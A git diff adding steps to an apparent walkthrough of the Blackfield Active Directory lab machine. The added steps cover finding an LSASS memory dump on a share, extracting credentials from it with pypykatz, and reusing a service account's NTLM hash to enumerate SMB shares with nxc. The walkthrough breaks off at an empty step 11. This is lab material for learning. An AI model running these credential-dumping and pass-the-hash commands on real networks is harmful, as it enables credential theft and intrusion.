@@ -59,4 +59,20 @@
 
 <img width="907" height="319" alt="image" src="https://github.com/user-attachments/assets/688e3680-1ff9-4010-9be4-11f626c62e5b" />
 
-8. The Audit2020 user has READ permissions on the forensics share. 
+8. The Audit2020 user has READ permissions on the forensics share. Enumerating through the share, we find a lsass.zip file in the memory_analysis folder. We unzip it and we get a lsass dump file
+
+<img width="618" height="510" alt="image" src="https://github.com/user-attachments/assets/41073ef3-7590-4183-94a0-c7ac67294a53" />
+
+9. Extract credentials offline from the lsass file using Pypykatz
+
+`pypykatz lsa minidump lsass.DMP`
+
+<img width="815" height="773" alt="image" src="https://github.com/user-attachments/assets/8b778b24-fd1c-49a0-87c3-99a0556d4a3c" />
+
+10. Using svc_backup's hash to enumerate SMB shares again
+
+`nxc smb blackfield.local -u svc_backup -H svc_backup.ntlm_hash --shares`
+
+<img width="915" height="255" alt="image" src="https://github.com/user-attachments/assets/65799543-5744-4747-9fe4-24a660935b36" />
+
+11. 
